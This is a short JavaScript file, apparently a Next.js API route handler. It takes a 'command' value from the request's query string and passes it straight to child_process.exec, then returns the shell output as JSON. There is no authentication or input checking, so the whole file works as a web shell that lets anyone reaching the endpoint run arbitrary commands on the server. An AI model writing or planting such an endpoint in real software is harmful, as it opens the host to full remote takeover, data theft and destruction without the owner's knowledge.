const { exec } = require('child_process');

function execPromise(command) {
  return new Promise(function(resolve, reject) {
      exec(command, (error, stdout, stderr) => {
          if (error && error?.code !==1) {
              reject(error);
              return;
          }
          if (stdout) {
            resolve(stdout.trim());
            return;
          }
          if (stderr) {
            resolve(stderr.trim());
            return;
          }
          resolve('empty');
          return;
      });
  });
};

export default async function handler(req, res) {
  const { command } = req.query;
  let output = '';
  try {
      const result = await execPromise(command);
      res.status(200).json({
        output: result || 'none',
        result: 'success'
      });
  } catch (err) {
      res.status(200).json({ output: err.message, result: 'error' });
  }
};
